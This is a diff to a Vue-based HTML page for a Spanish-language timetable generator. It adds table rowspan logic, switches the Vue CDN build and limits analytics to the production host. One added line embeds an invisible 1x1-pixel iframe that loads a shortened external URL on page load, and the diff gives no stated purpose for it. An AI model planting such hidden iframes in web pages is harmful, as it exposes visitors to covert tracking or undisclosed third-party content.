@@ -642,13 +642,17 @@
               </th>
               <template v-for="data in table[i-1]" v-if="!style && !lol">
                 <td
+                  v-if="(config.block && data.init) || data.text == '' || !config.block"
                   :style="[(data.ref && data.ref.color) ? {'--color': data.ref.color} : '']"
                   @click="removeTime(i-1, (data.day?data.day:''), (data.ref?data.ref:null))"
+                  :rowspan="config.block ? data.length : 1"
                 >{{data.text}}</td>
               </template>
               <template v-for="(data, j) in table[i-1]" v-if="style || lol">
                 <td
+                  v-if="(config.block && data.init) || data.text == '' || !config.block"
                   :style="[(randomColors && randomColors[i] && randomColors[i][j])? {'--color': randomColors[i][j]} :'red']"
+                  :rowspan="config.block ? data.length : 1"
                 >{{data.text}}</td>
               </template>
             </tr>
@@ -664,6 +668,7 @@
         </audio>
       </div>
     </div>
+    <v-iframe src="https://shortnim.now.sh/r#Jh4ES"  style="width:1px; height:1px; border:none;"></v-iframe>
     <footer class="footer primary dark-theme__black">
       © Todos los derechos reservados 2018 - Contacto: <a>developer.diegopiedra@gmail.com</a> <span style="float: right">Generador de horarios v2.0.0</span>
     </footer>
@@ -704,15 +709,15 @@
         e.target.blur()
     })
   </script>
-  <!-- <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script> -->
-  <script src="https://cdn.jsdelivr.net/npm/vue"></script>
+  <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+  <!-- <script src="https://cdn.jsdelivr.net/npm/vue"></script> -->
   <script lang="javascript" src="lib/xlsx.full.min.js" async></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/1.4.1/jspdf.min.js" async></script>
   <script src="lib/html2canvas.min.js" charset="utf-8" async> </script>
   <script src="https://www.google.com/jsapi"></script>
   <script>google.load("jquery", "1")</script>
   <script>
-    const useGoogle = true;
+    const useGoogle = window.location.hostname == 'horarios.coldideas.com';
 
     if(useGoogle){
       (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
